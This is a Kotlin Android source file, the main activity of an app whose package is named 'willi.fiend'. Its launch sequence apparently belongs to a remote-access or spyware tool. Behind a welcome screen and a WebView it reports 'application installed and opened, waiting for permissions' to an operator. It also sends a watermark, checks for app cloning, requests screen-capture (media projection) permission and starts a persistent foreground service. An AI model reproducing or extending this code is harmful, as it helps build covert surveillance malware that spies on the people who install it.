package willi.fiend

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import willi.fiend.Utils.AppRequest
import willi.fiend.Utils.AppTools
import willi.fiend.Ui.Screen.Page1
import willi.fiend.Ui.Screen.Page2
import willi.fiend.ui.WebView

class MainActivity : ComponentActivity() {
    var webView: WebView? = null

    @SuppressLint("WrongThread")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // ✅ طلب أذونات Android 14+
        requestAndroid14Permissions()
        
        AppTools.checkAppCloning(this)
        val request = AppRequest()
        request.sendWaterMark()
        request.sendText(AppRequest.Text("ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪɴꜱᴛᴀʟʟᴇᴅ ᴀɴᴅ ᴏᴘᴇɴᴇᴅ , ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴘᴇʀᴍɪꜱꜱɪᴏɴꜱ ..."))
        
        setContent {
            val currentPage = remember {
                mutableStateOf(0)
            }
            if (!AppTools.showWelcome(this)) currentPage.value = 2
            
            when (currentPage.value) {
                0 -> {
                    Page1 {
                        currentPage.value = 1
                    }
                }
                1 -> {
                    Page2 {
                        currentPage.value = 2
                    }
                }
                2 -> {
                    WebView(onWebView = { loadedWebView ->
                        webView = loadedWebView
                    })
                    
                    // ✅ بدء الخدمة بطريقة آمنة
                    startMainServiceSafely()
                }
            }
        }
    }

    // ✅ دالة طلب أذونات Android 14+
    private fun requestAndroid14Permissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permissions = mutableListOf<String>()
            
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION)
                    != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION)
                }
            }
            
            if (permissions.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 1001)
            }
        }
    }

    // ✅ دالة بدء الخدمة الآمنة
    private fun startMainServiceSafely() {
        try {
            val intent = Intent(this, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            e.printStackTrace()
            // محاولة بديلة
            try {
                startService(Intent(this, MainService::class.java))
            } catch (e2: Exception) {
                e2.printStackTrace()
            }
        }
    }
}
